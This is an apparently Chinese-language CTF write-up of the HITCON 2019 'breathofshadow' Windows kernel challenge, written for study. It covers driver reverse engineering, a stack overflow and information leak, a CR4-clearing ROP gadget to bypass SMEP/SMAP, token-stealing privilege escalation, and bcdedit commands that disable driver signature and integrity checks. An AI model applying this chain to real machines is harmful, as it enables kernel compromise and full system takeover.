<p><img src="https://hackmd.io/_uploads/Hk722La41x.png" alt="image"></p>
<h3 id="How-to-install-windows-driver"><a href="#How-to-install-windows-driver" class="headerlink" title="How to install windows driver"></a>How to install windows driver</h3><p>由於你的driver沒有簽章驗證，所以你必須開啟testing mode及關閉簽章驗證來掛上去你的driver</p>
<p><code>bcdedit /set testsigning on</code><br><code>bcdedit /set loadoptions DDISABLE_INTEGRITY_CHECKS</code><br><code>bcdedit /set nointegritychecks on</code><br>之後重啟應該會看到testing</p>
<p>接下來把driver掛起來<br><code>sc create &lt;your driver name&gt; binPath=&lt;Path of driver on windows&gt; type=kernel</code><br><code>sc start &lt;your driver name&gt;</code><br><code>sc delete &lt;your driver name&gt;</code></p>
<p>如何掛起kernelmode windows driver可以參考<br><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/debug-universal-drivers---step-by-step-lab--echo-kernel-mode-">https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/debug-universal-drivers---step-by-step-lab--echo-kernel-mode-</a></p>
<h3 id="how-to-use-your-driver"><a href="#how-to-use-your-driver" class="headerlink" title="how to use your driver"></a>how to use your driver</h3><p>他會去與<code>\\.\BreathofShadow </code>進行交互<br><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-tw/windows/win32/api/fileapi/nf-fileapi-createfilew">https://learn.microsoft.com/zh-tw/windows/win32/api/fileapi/nf-fileapi-createfilew</a><br><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-tw/windows/win32/api/ioapiset/nf-ioapiset-deviceiocontrol">https://learn.microsoft.com/zh-tw/windows/win32/api/ioapiset/nf-ioapiset-deviceiocontrol</a></p>
<p>PS: <code>\.\\</code>是device namespace<br><a target="_blank" rel="noopener" href="https://superuser.com/questions/1583205/what-kind-of-file-path-starts-with">https://superuser.com/questions/1583205/what-kind-of-file-path-starts-with</a><br><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/fileio/naming-a-file">https://learn.microsoft.com/en-us/windows/win32/fileio/naming-a-file</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> DeviceName <span class="string">L&quot;\\\\.\\BreathofShadow&quot;</span></span></span><br><span class="line">HANDLE hDevice = CreateFileW(DeviceName, GENERIC_READ | GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span>* inputbuf = (<span class="type">size_t</span>*)<span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0x100</span>);</span><br><span class="line"><span class="type">char</span> outputbuf[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">DWORD bytesReturned = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">BOOL result = DeviceIoControl(</span><br><span class="line">        hDevice,</span><br><span class="line">        <span class="number">0x9C40240B</span>,</span><br><span class="line">        inputbuf,</span><br><span class="line">        <span class="number">0x100</span>,</span><br><span class="line">        (LPVOID)outputbuf,</span><br><span class="line">        <span class="keyword">sizeof</span>(outputbuf),</span><br><span class="line">        &amp;bytesReturned,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    );</span><br></pre></td></tr></table></figure>

<h2 id="Protection"><a href="#Protection" class="headerlink" title="Protection"></a>Protection</h2><h3 id="KASLR"><a href="#KASLR" class="headerlink" title="KASLR"></a>KASLR</h3><p>每次開機時隨機化kernel address，只要不重新開機就不會變動</p>
<h3 id="SMEP"><a href="#SMEP" class="headerlink" title="SMEP"></a>SMEP</h3><p>kernel mode不能執行userspace的code<br>是否開啟位於cr4 bit 20</p>
<h3 id="SMAP"><a href="#SMAP" class="headerlink" title="SMAP"></a>SMAP</h3><p>kernel mode不能直接存取userspace data<br>是否開啟位於cr4 bit 21</p>
<h3 id="KVA-shadow"><a href="#KVA-shadow" class="headerlink" title="KVA shadow"></a>KVA shadow</h3><p>在linux kernel把它叫做KPTI<br>kernel&#x2F;Userland Page Table Isolation<br>在kernel mode時所有user space的PML4 NX bit會開起來，導致你就算disable SMEP也不能執行user space code</p>
<p><a target="_blank" rel="noopener" href="https://mdanilor.github.io/posts/hevd-2/">https://mdanilor.github.io/posts/hevd-2/</a></p>
<h3 id="Stack-Cookies"><a href="#Stack-Cookies" class="headerlink" title="Stack Cookies"></a>Stack Cookies</h3><p>就是stack canary的概念<br><a target="_blank" rel="noopener" href="https://breaking-bits.gitbook.io/breaking-bits/exploit-development/linux-kernel-exploit-development/stack-cookies">https://breaking-bits.gitbook.io/breaking-bits/exploit-development/linux-kernel-exploit-development/stack-cookies</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.--------------------.-----------------------.</span><br><span class="line">|    tmp[0]          |    0xDEADBEEF         | &lt;- 4 bytes</span><br><span class="line">|--------------------|-----------------------| </span><br><span class="line">|    tmp[1]          |    0x0                | &lt;- 4 bytes</span><br><span class="line">|--------------------|-----------------------|</span><br><span class="line">|    ...             |    0x0                | &lt;- each 4 bytes</span><br><span class="line">|--------------------|-----------------------|</span><br><span class="line">|    tmp[31]         |    0xCAFEBABE         | &lt;- 4 bytes</span><br><span class="line">|--------------------|-----------------------|</span><br><span class="line">|    stack cookie    |    0x2311AC4753522700 | &lt;- 8 bytes and random</span><br><span class="line">|--------------------|-----------------------|</span><br><span class="line">|    rbx register    |    saved rbx register | &lt;- 8 bytes</span><br><span class="line">|--------------------|-----------------------|</span><br><span class="line">|    rip register    |    saved rip register | &lt;- 8 bytes and random</span><br><span class="line">.--------------------.-----------------------.</span><br></pre></td></tr></table></figure>

<h2 id="information-leak"><a href="#information-leak" class="headerlink" title="information leak"></a>information leak</h2><p>如果process的integrity是medium<br>通過調用NtQuerySystemInformation可以獲得所有sys或nt address，及handle對應Object位置<br><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-tw/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation">https://learn.microsoft.com/zh-tw/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation</a></p>
<h2 id="ret2usr"><a href="#ret2usr" class="headerlink" title="ret2usr"></a>ret2usr</h2><p>核心概念是透過stack overflow，來Return 到userspace上的shellcode上，為何要跳回userspace原因是要在沒有任意讀任意寫情況下在kernel space 放shellcode並執行有難度，所以在userspace給一塊rwx個memory，並把shellcode寫進去跳進去</p>
<p>不過首先會遇到一個問題 SMAP&#x2F;SMEP<br>不過在有stack overflow可以堆ROP時繞過他蠻簡單的，透過將cr4的第20bit 21bit蓋成0就可以了</p>
<p>pop rcx; ret<br>mov cr4, rcx ; ret</p>
<p>接下來透過shellcode來抓出token(高權限)，並寫掉自己的token來提權</p>
<h2 id="HITCON-CTF-2019-Qual-breathofshadow"><a href="#HITCON-CTF-2019-Qual-breathofshadow" class="headerlink" title="HITCON CTF 2019 Qual breathofshadow"></a>HITCON CTF 2019 Qual breathofshadow</h2><p><a target="_blank" rel="noopener" href="https://github.com/scwuaptx/CTF/tree/master/2019-writeup/hitcon/breathofshadow">https://github.com/scwuaptx/CTF/tree/master/2019-writeup/hitcon/breathofshadow</a></p>
<h3 id="analyze"><a href="#analyze" class="headerlink" title="analyze"></a>analyze</h3><p>首先他給了一個windows drive，來分析看看<br>reverse windows driver 我有看到一篇不錯的文章可以參考<br><a target="_blank" rel="noopener" href="https://v1k1ngfr.github.io/winkernel-reverse-ida-ghidra/">https://v1k1ngfr.github.io/winkernel-reverse-ida-ghidra/</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_140006000</span><span class="params">(PDRIVER_OBJECT DriverObject)</span></span><br><span class="line">&#123;</span><br><span class="line">  NTSTATUS v2; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// rbx</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> <span class="title">DeviceName</span>;</span> <span class="comment">// [rsp+40h] [rbp-28h] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> <span class="title">DestinationString</span>;</span> <span class="comment">// [rsp+50h] [rbp-18h] BYREF</span></span><br><span class="line">  PDEVICE_OBJECT DeviceObject; <span class="comment">// [rsp+80h] [rbp+18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  DeviceObject = <span class="number">0</span>i64;</span><br><span class="line">  RtlInitUnicodeString(&amp;DeviceName, <span class="string">L&quot;\\Device\\BreathofShadow&quot;</span>);</span><br><span class="line">  v2 = IoCreateDevice(DriverObject, <span class="number">0</span>, &amp;DeviceName, <span class="number">0x22</span>u, <span class="number">0x100</span>u, <span class="number">0</span>, &amp;DeviceObject);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    DriverObject-&gt;MajorFunction[<span class="number">0</span>] = (PDRIVER_DISPATCH)&amp;createdeleteHandle;</span><br><span class="line">    DriverObject-&gt;MajorFunction[<span class="number">2</span>] = (PDRIVER_DISPATCH)&amp;createdeleteHandle;</span><br><span class="line">    DriverObject-&gt;MajorFunction[<span class="number">14</span>] = (PDRIVER_DISPATCH)&amp;ctlHandler;</span><br><span class="line">    DriverObject-&gt;DriverUnload = (PDRIVER_UNLOAD)sub_1400051C0;</span><br><span class="line">    RtlInitUnicodeString(&amp;DestinationString, <span class="string">L&quot;\\DosDevices\\BreathofShadow&quot;</span>);</span><br><span class="line">    v2 = IoCreateSymbolicLink(&amp;DestinationString, &amp;DeviceName);</span><br><span class="line">    <span class="keyword">if</span> ( v2 &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      DbgPrint(<span class="string">&quot;Couldn&#x27;t create symbolic link\n&quot;</span>);</span><br><span class="line">      IoDeleteDevice(DeviceObject);</span><br><span class="line">    &#125;</span><br><span class="line">    DeviceObject-&gt;Flags |= <span class="number">0x10</span>u;</span><br><span class="line">    DeviceObject-&gt;Flags &amp;= <span class="number">0xFFFFFF7F</span>;</span><br><span class="line">    Seed = KeQueryTimeIncrement();</span><br><span class="line">    v3 = (<span class="type">unsigned</span> __int64)RtlRandomEx(&amp;Seed) &lt;&lt; <span class="number">32</span>;</span><br><span class="line">    qword_140003018 = v3 | RtlRandomEx(&amp;Seed);</span><br><span class="line">    DbgPrint(<span class="string">&quot;Enable Breath of Shadow Encryptor\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    _mm_lfence();</span><br><span class="line">    DbgPrint(<span class="string">&quot;Couldn&#x27;t create the device object\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>這裡他建立了一個Device(IoCreateDevice)</p>
<p><code> L&quot;\\Device\\BreathofShadow&quot;</code>是deivce name<br>然後去設定MajorFunction，處理IRP</p>
<p>第一個createdeleteHandle沒做甚麼就直接回傳IofCompleteRequest</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_CREATE                             0x00</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_CLOSE                              0x02</span></span><br><span class="line"></span><br><span class="line">__int64 __fastcall <span class="title function_">createdeleteHandle</span><span class="params">(__int64 a1, IRP *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  a2-&gt;IoStatus.Status = <span class="number">0</span>;</span><br><span class="line">  a2-&gt;IoStatus.Information = <span class="number">0</span>i64;</span><br><span class="line">  IofCompleteRequest(a2, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>這邊重要的是<br>有些symbol爛了自己修一下<br>這邊補充一下IoStackLocation<br><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_io_stack_location">https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_io_stack_location</a></p>
<p>詳細IoStackLocation可以參考這個<br><a target="_blank" rel="noopener" href="https://v1k1ngfr.github.io/pimp-my-pid/">https://v1k1ngfr.github.io/pimp-my-pid/</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_DEVICE_CONTROL                     0x0e</span></span><br><span class="line"></span><br><span class="line">__int64 __fastcall <span class="title function_">ctlHandler</span><span class="params">(__int64 a1, IRP *IRP)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// edi</span></span><br><span class="line">  PIO_STACK_LOCATION IRP_STACK_LOCATION; <span class="comment">// rax</span></span><br><span class="line">  __int64 IoStackLocation; <span class="comment">// rsi</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0xC00000BB</span>;</span><br><span class="line">  IRP_STACK_LOCATION = IoGetCurrentIrpStackLocation(IRP);</span><br><span class="line">  IoStackLocation = (__int64)IRP_STACK_LOCATION;</span><br><span class="line">  <span class="keyword">if</span> ( IRP_STACK_LOCATION )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( IRP_STACK_LOCATION-&gt;Parameters.Read.ByteOffset.LowPart == <span class="number">0x9C40240B</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      DbgPrint(<span class="string">&quot;Breath of Shadow Encryptor\n&quot;</span>);</span><br><span class="line">      v3 = sub_140005000((__int64)IRP, IoStackLocation);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      DbgPrint(<span class="string">&quot;Invalid\n&quot;</span>);</span><br><span class="line">      v3 = <span class="number">-1073741808</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  IRP-&gt;IoStatus.Information = <span class="number">0</span>i64;</span><br><span class="line">  IRP-&gt;IoStatus.Status = v3;</span><br><span class="line">  IofCompleteRequest(IRP, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果IoControlCode是0x9C40240B，就Call進去<br>一樣是symbol全爛，自己修一下</p>
<p>NtDeviceIoControlFile:</p>
<ul>
<li>Parameters.DeviceIoControl.OutputBufferLength(0x8)</li>
<li>Parameters.DeviceIoControl.InputBufferLength(0x10)</li>
<li>Parameters.DeviceIoControl.IoControlCode(0x18)</li>
<li>Parameters.DeviceIoControl.Type3InputBuffer(0x20)</li>
<li>Parameters.QuerySecurity(0x28)</li>
</ul>
<p>我們互動的東西會存在IoStackLocation的inputbuffer(可控)<br>他會將InputBuffer丟進去Dst(一個有限大小的buffer)<br>這裡就有一個buffer overflow</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_140005000</span><span class="params">(__int64 IRP, __int64 IO_STACK_LOCATON)</span></span><br><span class="line">&#123;</span><br><span class="line">  __m128i *InputBuffer; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 InputBufferLength; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 OutputBufferLength; <span class="comment">// r14</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// ecx</span></span><br><span class="line">  __int64 Dst[<span class="number">32</span>]; <span class="comment">// [rsp+30h] [rbp-128h] BYREF</span></span><br><span class="line"></span><br><span class="line">  InputBuffer = *(__m128i **)(IO_STACK_LOCATON + <span class="number">32</span>);</span><br><span class="line">  InputBufferLength = *(<span class="type">unsigned</span> <span class="type">int</span> *)(IO_STACK_LOCATON + <span class="number">16</span>);</span><br><span class="line">  OutputBufferLength = *(<span class="type">unsigned</span> <span class="type">int</span> *)(IO_STACK_LOCATON + <span class="number">8</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !InputBuffer )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">3221225473</span>i64;</span><br><span class="line">  <span class="built_in">memset</span>((__m128 *)Dst, <span class="number">0</span>, <span class="number">0x100</span>ui64);</span><br><span class="line">  ProbeForRead(InputBuffer, <span class="number">0x100</span>ui64, <span class="number">1u</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>((__m128i *)Dst, (<span class="type">unsigned</span> __int64)InputBuffer, (<span class="type">unsigned</span> <span class="type">int</span>)InputBufferLength);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; InputBufferLength &gt;&gt; <span class="number">3</span>; ++i )</span><br><span class="line">    Dst[i] ^= qword_140003018;</span><br><span class="line">  ProbeForWrite(InputBuffer, <span class="number">0x100</span>ui64, <span class="number">1u</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(InputBuffer, (<span class="type">unsigned</span> __int64)Dst, OutputBufferLength);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>另外我們還需要information leak<br>原因是因為cookie(像是stack canary)、XorKey、KernelBase(ROP need)需要leak出來<br>這邊其實information leak洞非常明顯<br>如果inputbuffer塞超小<br>outputbuffer塞超大<br>DST值會只有少部分被xor<br>而DST被copy到inputbuffer(根據output buffer)<br>這樣就可以任意讀stack上的value(也就有information leak)</p>
<p>IoControl互動方式就跟上述一樣</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">DeviceIoControl</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]                HANDLE       hDevice,</span></span><br><span class="line"><span class="params">  [in]                DWORD        dwIoControlCode,</span></span><br><span class="line"><span class="params">  [in, optional]      LPVOID       lpInBuffer,</span></span><br><span class="line"><span class="params">  [in]                DWORD        nInBufferSize,</span></span><br><span class="line"><span class="params">  [out, optional]     LPVOID       lpOutBuffer,</span></span><br><span class="line"><span class="params">  [in]                DWORD        nOutBufferSize,</span></span><br><span class="line"><span class="params">  [out, optional]     LPDWORD      lpBytesReturned,</span></span><br><span class="line"><span class="params">  [in, out, optional] LPOVERLAPPED lpOverlapped</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
<p>很顯然ret2usr<br>條件已經湊齊了<br>接著來看EoP</p>
<h3 id="EoP"><a href="#EoP" class="headerlink" title="EoP"></a>EoP</h3><p><a target="_blank" rel="noopener" href="https://www.matteomalvica.com/blog/2019/07/06/windows-kernel-shellcode/#token-stealing">https://www.matteomalvica.com/blog/2019/07/06/windows-kernel-shellcode/#token-stealing</a></p>
<p>目標是取得system integrity 的 process token，並寫進自己的process token<br>當我們有任意執行shellcode時，透過去traverse整個EPROCESS(linklist)，並找到system process，然後換掉自己的token成system process，來達到EoP</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">+------------------------+    +------------------------+    +------------------------+</span><br><span class="line">|       _EPROCESS        |    |       _EPROCESS        |    |       _EPROCESS        |</span><br><span class="line">+------------------------+    +------------------------+    +------------------------+</span><br><span class="line">|         PCB            |    |         PCB            |    |         PCB            |</span><br><span class="line">|        ....            |    |        ....            |    |        ....            |</span><br><span class="line">|   UniqueProcessId      |    |   UniqueProcessId      |    |          4             |</span><br><span class="line">|  ActiveProcessLinks    |&lt;--&gt;|  ActiveProcessLinks    |&lt;--&gt;|  ActiveProcessLinks    |</span><br><span class="line">|        ....            |    |        ....            |    |        ....            |</span><br><span class="line">|        Token           |    |        Token           |    |   Token (system token) |</span><br><span class="line">|        ....            |    |        ....            |    |        ....            |</span><br><span class="line">|         PEB            |    |         PEB            |    |         PEB            |</span><br><span class="line">|        ....            |    |        ....            |    |        ....            |</span><br><span class="line">|   ThreadListHead       |    |   ThreadListHead       |    |   ThreadListHead       |</span><br><span class="line">|        ....            |    |        ....            |    |        ....            |</span><br><span class="line">+------------------------+    +------------------------+    +------------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>要拿token代表要拿到system EPROCESS<br>代表要找到一個EPORCESS透過ActiveProcessLinks尋找<br>要如何找到呢?</p>
<p>有一塊struct叫做KPCR(Kernel Process Control Region)<br>在Windows 64 bits時gs register恆指向該struct</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">+--------------------+ 0x0</span><br><span class="line">|      GdtBase       |</span><br><span class="line">+--------------------+ 0x8</span><br><span class="line">|      TssBase       |</span><br><span class="line">+--------------------+ 0x10</span><br><span class="line">|      UserRsp       |</span><br><span class="line">+--------------------+</span><br><span class="line">|        ...         |</span><br><span class="line">+--------------------+ 0x180</span><br><span class="line">|        Prcb        |</span><br><span class="line">+--------------------+</span><br><span class="line">|                    |</span><br><span class="line">|        ...         |</span><br><span class="line">|                    |</span><br><span class="line">+--------------------+</span><br></pre></td></tr></table></figure>
<p>裡面有一塊叫做PRCB(Kernel Process Control Block)<br>PRCB裡有Current Thread(KTHREAD)</p>
<p>ETHREAD裡面有TCB，TCB有Process指向EPROCESS</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+---------------+ 0xf0</span><br><span class="line">|      TEB      | 指向userspace</span><br><span class="line">+---------------+</span><br><span class="line">|     ...       | </span><br><span class="line">+---------------+ 0x220</span><br><span class="line">|    Process    | 指向該thread所屬的process的ERPORCESS</span><br><span class="line">+---------------+</span><br></pre></td></tr></table></figure>
<p>所以就可以透過gs拿到EPROCESS了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">+----------------------------+   GS:[0x0] -&gt; KPCR</span><br><span class="line">|          _KPCR             |   Base Address: GS:[0]</span><br><span class="line">+----------------------------+</span><br><span class="line">|  0x0    | GdtBase          |</span><br><span class="line">|  0x8    | TssBase          |</span><br><span class="line">|  0x10   | UserRsp          |</span><br><span class="line">|   ...                     |</span><br><span class="line">|  0x180  | Prcb             | &lt;--- GS:[0x180]</span><br><span class="line">+----------------------------+</span><br><span class="line">          |</span><br><span class="line">          V</span><br><span class="line">+----------------------------+   GS:[0x180] -&gt; PRCB</span><br><span class="line">|          _KPRCB            |</span><br><span class="line">+----------------------------+</span><br><span class="line">|   ...                      |</span><br><span class="line">|   0x188  | CurrentThread   | &lt;--- GS:[0x188]</span><br><span class="line">|   ...                      |</span><br><span class="line">+----------------------------+</span><br><span class="line">          |</span><br><span class="line">          V</span><br><span class="line">+----------------------------+   CurrentThread -&gt; ETHREAD</span><br><span class="line">|          _ETHREAD          |   </span><br><span class="line">+----------------------------+</span><br><span class="line">|  0x0    | Tcb              |  --&gt; KTHREAD</span><br><span class="line">|   ...                      |</span><br><span class="line">|  0x4e8  | ThreadListEntry  |  </span><br><span class="line">|   ...                      |</span><br><span class="line">+----------------------------+</span><br><span class="line">          |</span><br><span class="line">          V</span><br><span class="line">+----------------------------+   Tcb -&gt; KTHREAD</span><br><span class="line">|       _KTHREAD (Tcb)       | </span><br><span class="line">+----------------------------+</span><br><span class="line">|   ...                      |</span><br><span class="line">|  Stackbase                 |</span><br><span class="line">|   ...                      |</span><br><span class="line">|  TrapFrame                 |</span><br><span class="line">|   ...                      |</span><br><span class="line">|  Teb                      | &lt;-- Thread Environment Block</span><br><span class="line">|   ...                      |</span><br><span class="line">|  Process                   |</span><br><span class="line">|   ...                      |</span><br><span class="line">+----------------------------+</span><br></pre></td></tr></table></figure>

<p>遍歷EPROCESS時可以查看是否PID是4，因為這支就是system</p>
<p><img src="https://hackmd.io/_uploads/HkZadSRVye.png" alt="image"></p>
<p>那以上就是EoP的方法<br>來整理一下攻擊流程</p>
<ol>
<li>Information leak vuln leak stack cookie, kernel base, xor key. </li>
<li>Use Stack overflow control RIP, and then use ROP change cr4 and Page table’s NX bypass SMEP, SMAP, KVA shadow</li>
<li>And then jump to usermode’s shellcode</li>
<li>Use gs find structure _KPCR -&gt; _ETHREAD -&gt; EPROCESS</li>
<li>Loop traverse EPROCESS linklist and find pid 4’s process. It is system integrity process’s token</li>
<li>Change yourself process token and return (You must recover register about protection, because kernel will check.) </li>
<li>Get shell and you get priviledge</li>
</ol>
<p>PS: 偷偷爆個雷，當你get shell後會發現該process砍不掉，原因是因為沒有IoCompleteRequest導致driver一直在等待，所以最後記得回傳，這樣可以讓exploit更穩定</p>
<p>順便補充gs register、KPCR是啥</p>
